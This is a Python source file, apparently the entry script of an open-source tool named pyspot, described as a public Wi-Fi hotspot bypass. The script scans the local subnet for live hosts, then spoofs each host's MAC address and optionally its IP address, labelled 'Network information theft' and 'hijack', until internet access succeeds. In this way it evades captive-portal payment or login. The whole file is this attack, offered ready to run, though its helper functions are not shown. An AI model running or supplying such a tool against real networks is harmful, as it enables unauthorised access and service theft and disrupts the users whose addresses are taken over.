#!/usr/bin/env python3
from netaddr import IPNetwork, cidr_merge, cidr_exclude
from lib.parse import *
from lib.func import *
import argparse
import sys

__author__  = 'Regis SENET'
__email__   = 'regis.senet@orhus.fr'
__git__     = 'https://github.com/rsenet/pyspot'
__version__ = '0.1'
short_desc  = "Public Wi-Fi HotSpot ByPass"

arg_parser = argparse.ArgumentParser(description=short_desc)
arg_parser.add_argument('--iface', help="Specify Wireless Interface conncted to HotSpot Wi-Fi", required=True)
arg_parser.add_argument('--ipspoof', help="Hijack MAC AND IP addresses", action='store_true')
arg_parser.add_argument('--verbose', help="Set verbose mode", action='store_true')
u_args = arg_parser.parse_args()
iface = u_args.iface
ipspoof = u_args.ipspoof
verbose = u_args.verbose


if __name__ == "__main__":
    try:
        # Check permissions
        check_privileges()

        # Get network information
        ipaddr, ipbroadcast, ipnetmask, macaddr, ssid = get_addr_info(iface)
        cidr = convert_netmask_to_cidr(ipnetmask)

        print("\n[x] Current network information")
        print(f" -  Interface: {iface}")
        print(f" -  SSID: {ssid}")
        print(f" -  IP Address: {ipaddr}")
        print(f" -  Broadcast IP: {ipbroadcast}")
        print(f" -  Netmask (CIDR): {ipnetmask} (/{cidr})")
        print(f" -  Physical Address: {macaddr}")

        print("\n[x] Identify appropriate subnet")
        # If necessary, split large networks into /24 subnets
        if(int(convert_netmask_to_cidr(ipnetmask)) < 24):
            subnets = parse.IPSplitter(f'{ipaddr}/{cidr}')
            subnets = subnets.get_subnet(24)

            print(f" -  Splitting current network into {len(subnets)} subnets to speed up network scan")

            for subnet in subnets:
                if verbose:
                    print(f"  -  Scanning {subnet}...")

                up_hosts = scan_network(str(subnet), ipaddr)

        else:
            if verbose:
                print(f"  -  Scanning {ipaddr}/{cidr}...")

            up_hosts = scan_network(str(f"{ipaddr}/{cidr}"), ipaddr)

        if len(up_hosts) == 0:
            sys.exit("[x] No hosts found. Leaving...")

        print("\n[x] Network information theft")
        for element in up_hosts:
            ipaddr, macaddr = element.split(";")

            if verbose:
                if ipspoof:
                    print(f" - Trying to hijack {ipaddr} / {macaddr}")

                else:
                    print(f" - Trying to hijack {macaddr}")

            hijack_ip_and_mac(iface, ipaddr, ipbroadcast, ipnetmask, macaddr, ipspoof)

            if check_internet_cnx():
                print("\n[!] Internet is now reachable!!")
                print(f" New IP: {ipaddr}")
                print(f" New MAC: {macaddr}")
                sys.exit(0)

    except KeyboardInterrupt:
        sys.exit("[x] Leaving...")
